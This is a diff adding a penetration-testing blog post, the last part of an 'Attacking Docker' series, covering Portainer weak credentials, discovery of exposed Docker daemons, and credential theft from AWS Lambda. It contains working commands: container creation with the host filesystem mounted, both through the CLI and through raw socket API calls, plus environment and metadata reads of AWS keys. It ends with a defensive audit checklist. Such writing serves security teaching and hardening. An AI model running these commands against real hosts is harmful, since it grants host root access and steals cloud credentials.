@@ -1,0 +1,97 @@
+---
+title: "Portainer, image forensics, and Lambda container abuse"
+description: "Weak Portainer credentials, Shodan recon for exposed management UIs, remote Docker host discovery, and pivoting from AWS Lambda container runtimes to cloud credentials."
+date: 2022-02-20
+seriesSlug: "docker-offensive"
+seriesTitle: "Attacking Docker"
+seriesPart: 6
+seriesDescription: "Offensive Docker: container triage through escape paths, capabilities, registries, and runtime abuse."
+tags: ["docker", "portainer", "lambda", "red-team", "docker-offensive"]
+---
+
+> Lab notes from authorised assessments and training environments. Do not point these techniques at systems you do not own or have written permission to test.
+
+The earlier parts of this series assume I already have a shell. This post covers how I **find** Docker management surfaces from the outside and what I do with two common non-Docker-host targets: **Portainer** and **AWS Lambda** execution environments. It closes the [Attacking Docker](/blog/docker-pentest-playbook/) track.
+
+## Portainer: default creds and exposed UIs
+
+[Portainer](https://www.portainer.io/) is a web UI for Docker and Kubernetes. It almost always has access to `/var/run/docker.sock` or a TCP endpoint, which makes the UI itself a high-value target.
+
+What I look for:
+
+- Admin interface on a public IP or NodePort without VPN
+- Default or reused passwords (`admin` / `admin` variants show up in labs constantly)
+- Portainer running with **privileged mode** enabled so operators can bind-mount host paths from the UI
+
+External recon:
+
+```bash
+# Shodan / Censys queries for Portainer fingerprints
+# e.g. http.title:"Portainer" port:9000
+nmap -sT -p 9000,9443 <target>
+```
+
+After login (or credential stuffing), I create or restart a container with `-v /:/host` and chroot, same as [escape paths](/blog/docker-escape-paths/). The chain from a vulnerable app on `--network=host` to Portainer on localhost to host root is common enough that I document it in every Docker report template.
+
+## Remote Docker host discovery
+
+Not all Docker abuse starts inside a container. During internal network scans I look for daemon ports:
+
+```bash
+nmap -sT -p 2375,2376 <subnet>
+```
+
+```bash
+export DOCKER_HOST=tcp://192.168.1.50:2375
+docker images
+docker run -it -v /:/host ubuntu:22.04 bash
+```
+
+See [Container runtime escape via exposed Docker API](/blog/kubernetes-docker-runtime-escape/) for the full TCP workflow on cluster workers. On standalone hosts the impact is identical: unauthenticated API access is root.
+
+## Docker REST API without the CLI
+
+Whether the socket is UNIX or TCP, the HTTP API is documented in the [Engine API reference](https://docs.docker.com/engine/api/v1.43/). Pentesters care because minimal containers lack the CLI but still expose the socket:
+
+```bash
+curl --unix-socket /var/run/docker.sock http://localhost/images/json
+curl --unix-socket /var/run/docker.sock -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"ubuntu","Cmd":["bash"],"HostConfig":{"Binds":["/:/host"]}}' \
+  http://localhost/containers/create
+```
+
+Listing and pulling registry images through the API also works when outbound access is allowed, which matters for [registry abuse](/blog/docker-registry-offensive/) from inside a compromised app container.
+
+## AWS Lambda execution environment
+
+Lambda functions run inside short-lived containers ([AWS execution environment](https://docs.aws.amazon.com/lambda/latest/dg/lambda-runtime-environment.html)). The sandbox is tight but not empty:
+
+- Read-only root filesystem except `/tmp` (512 MB)
+- No inbound network; outbound TCP allowed
+- Max execution time 15 minutes
+
+Abuse path when I have command execution in a function:
+
+1. Read environment variables and `/proc` for secrets
+2. Steal `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and session tokens from the runtime
+3. Pivot with [PACU](https://github.com/RhinoSecurityLabs/pacu) or native AWS CLI from an attacker-controlled host
+
+```bash
+env | grep AWS
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+Lambda is not Docker escape in the kernel sense, but it is container-adjacent infrastructure I encounter in the same engagements as ECS and Kubernetes. Cloud metadata abuse overlaps with [Kubernetes post-exploitation](/blog/kubernetes-post-exploitation/).
+
+## Auditing checklist I hand to blue teams
+
+When I wrap a Docker-focused assessment, the report usually includes:
+
+- `ls -l /var/run/docker.sock` permissions and group membership
+- `docker bench-security` or [dockscan](https://github.com/kost/dockscan) output
+- Registry TLS/auth posture and image scanning (Trivy/Clair)
+- Whether management UIs (Portainer, Rancher, CI dashboards) are network-reachable
+- [Falco](https://github.com/falcosecurity/falco) rules for `docker run` spawned from inside containers
+
+That closes the loop from [triage](/blog/docker-pentest-playbook/) through escape, capabilities, runtime, and registry paths in this series.
